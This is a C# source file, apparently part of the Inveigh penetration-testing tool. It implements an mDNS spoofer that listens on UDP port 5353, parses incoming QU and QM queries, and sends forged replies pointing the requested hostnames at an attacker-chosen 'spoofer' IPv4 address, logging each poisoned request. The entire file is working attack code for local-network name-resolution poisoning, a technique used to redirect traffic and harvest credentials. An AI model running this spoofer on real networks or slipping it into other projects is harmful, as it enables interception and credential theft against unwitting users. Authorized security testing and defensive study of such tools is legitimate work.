using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class MDNS
    {

        public static void MDNSListener(string ipVersion, string IP, string spooferIP, string spooferIPv6, string mdnsTTL, string[] mdnsQuestions, string[] mdnsTypes)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] spooferIPv6Data = IPAddress.Parse(spooferIPv6).GetAddressBytes();
            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
            Array.Reverse(ttlMDNS);
            IPEndPoint mdnsEndpoint = new IPEndPoint(IPAddress.Any, 5353);
            UdpClient mdnsClient = UDP.UDPListener("MDNS", IP, 5353, ipVersion);

            while (!Program.exitInveigh)
            {

                try
                {
                    string mdnsResponseMessage = "";
                    byte[] udpPayload = mdnsClient.Receive(ref mdnsEndpoint);
                    int mdnsSourcePort = mdnsEndpoint.Port;
                    byte[] mdnsType = new byte[2];
                    IPAddress sourceIPAddress = mdnsEndpoint.Address;

                    if (BitConverter.ToString(udpPayload).EndsWith("-00-01-80-01") && String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-01-00-00-00-00-00-00"))
                    {
                        byte[] mdnsTransactionID = new byte[2];
                        string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                        System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                        byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                        System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                        byte[] mdnsRequestRecordType = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, (mdnsRequest.Length + 12), mdnsRequestRecordType, 0, 2);
                        string mdnsRecordType = Util.GetRecordType(mdnsRequestRecordType);
                        mdnsResponseMessage = Util.CheckRequest(mdnsRequestHostFull, sourceIPAddress.ToString(), IP.ToString(), "MDNS", "QU", mdnsQuestions);

                        if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                        {

                            if (Array.Exists(mdnsTypes, element => element == "QU"))
                            {
                                byte[] mdnsResponse = MDNS.GetMDNSResponse("sniffer", ipVersion, mdnsTTL, sourceIPAddress, IPAddress.Parse(IP), spooferIPData, spooferIPv6Data, Util.IntToByteArray2(mdnsSourcePort), udpPayload);
                                IPEndPoint mdnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, mdnsSourcePort);
                                UDP.UDPListenerClient(sourceIPAddress, mdnsSourcePort, mdnsClient, mdnsResponse);
                                mdnsClient = UDP.UDPListener("MDNS", IP, 5353, ipVersion);
                            }
                            else if (!String.Equals(mdnsRecordType, "A"))
                            {
                                mdnsResponseMessage = "record type not supported";
                            }
                            else
                            {
                                mdnsResponseMessage = "mDNS type disabled";
                            }

                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] mDNS(QU) request for {1}({2}) from {3} [{4}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, mdnsRecordType, sourceIPAddress, mdnsResponseMessage));
                        }


                    }
                    else if (BitConverter.ToString(udpPayload).EndsWith("-00-01") && (String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-01-00-00-00-00-00-00") ||
                        String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-02-00-00-00-00-00-00")))
                    {
                        byte[] mdnsTransactionID = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                        string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                        byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                        System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                        byte[] mdnsRequestRecordType = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, (mdnsRequest.Length + 12), mdnsRequestRecordType, 0, 2);
                        string mdnsRecordType = Util.GetRecordType(mdnsRequestRecordType);
                        mdnsResponseMessage = Util.CheckRequest(mdnsRequestHostFull, sourceIPAddress.ToString(), IP.ToString(), "MDNS", "QM", mdnsQuestions);

                        if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                        {

                            if (Array.Exists(mdnsTypes, element => element == "QM"))
                            {
                                byte[] mdnsResponse = MDNS.GetMDNSResponse("sniffer", ipVersion, mdnsTTL, sourceIPAddress, IPAddress.Parse(IP), spooferIPData, spooferIPv6Data, Util.IntToByteArray2(mdnsSourcePort), udpPayload);
                                IPEndPoint mdnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, mdnsSourcePort);
                                UDP.UDPListenerClient(sourceIPAddress, mdnsSourcePort, mdnsClient, mdnsResponse);
                                mdnsClient = UDP.UDPListener("MDNS", IP, 5353, ipVersion);
                            }
                            else if (!String.Equals(mdnsRecordType, "A"))
                            {
                                mdnsResponseMessage = "record type not supported";
                            }
                            else
                            {
                                mdnsResponseMessage = "mDNS type disabled";
                            }

                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] mDNS(QM) request for {1}({2}) from {3} [{4}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, mdnsRecordType, sourceIPAddress, mdnsResponseMessage));
                        }

                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] mDNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static byte[] GetMDNSResponse(string type, string ipVersion, string mdnsTTL, IPAddress sourceIPAddress, IPAddress destinationIPAddress, byte[] spooferIPData, byte[] spooferIPv6Data, byte[] udpSourcePort, byte[] udpPayload)
        {
            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
            Array.Reverse(ttlMDNS);
            byte[] mdnsTransactionID = new byte[2];
            System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
            string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
            byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
            System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
            string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');

            MemoryStream mdnsMemoryStream = new MemoryStream();

            if(String.Equals(type, "sniffer"))
            {
                mdnsMemoryStream.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                mdnsMemoryStream.Write(udpSourcePort, 0, 2);
                mdnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                mdnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            }

            mdnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            mdnsMemoryStream.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
            mdnsMemoryStream.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
            mdnsMemoryStream.Write(mdnsRequest, 0, mdnsRequest.Length);
            mdnsMemoryStream.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
            mdnsMemoryStream.Write(ttlMDNS, 0, 4);
            mdnsMemoryStream.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
            mdnsMemoryStream.Write(spooferIPData, 0, spooferIPData.Length);


            return mdnsMemoryStream.ToArray();
        }

    }

}
